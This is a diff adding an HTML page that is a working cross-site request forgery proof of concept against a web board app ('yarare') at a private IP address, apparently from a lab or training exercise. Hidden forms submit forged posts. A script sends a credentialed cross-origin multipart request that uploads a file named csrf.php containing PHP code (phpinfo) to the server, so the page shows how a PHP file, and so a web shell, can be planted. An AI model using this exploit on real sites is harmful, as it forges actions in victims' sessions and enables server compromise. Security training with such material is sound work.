@@ -1,0 +1,38 @@
+<html>
+
+<head>
+  <meta charset="utf-8">
+</head>
+
+<body>
+  <form action="http://10.210.145.28/yarare/" method="POST" id="form1">
+    <input type="hidden" name="content" value="###////CSRF!!!////###">
+    <input type="hidden" name="newpost_submit" value="xxx">
+  </form>
+  <form action="http://10.210.145.28/yarare/" method="POST" id="form2">
+    <input type="hidden" name="upfile_name" value="csrf.php">
+    <input type="hidden" name="backup_path" value="/home/yarare-board/yarare-board/server/yarare/backupfile/csrf.php">
+    <input type="hidden" name="newpost_submit" value="yyy">
+  </form>
+  <script>
+    data = '\
+----BNDRY\n\
+Content-Disposition: form-data; name="upfile"; filename="csrf.php"\n\
+Content-Type: taxt/plain\n\
+\n\
+<?php phpinfo();\n\
+\n\
+----BNDRY--\n\
+        ';
+    var req = new XMLHttpRequest();
+    req.open('POST', 'http://10.210.145.28/yarare/');
+    req.setRequestHeader('Content-Type', 'multipart/form-data; boundary=--BNDRY');
+    req.withCredentials = true;
+    req.send(data);
+  </script>
+  <script>
+
+  </script>
+</body>
+
+</html>
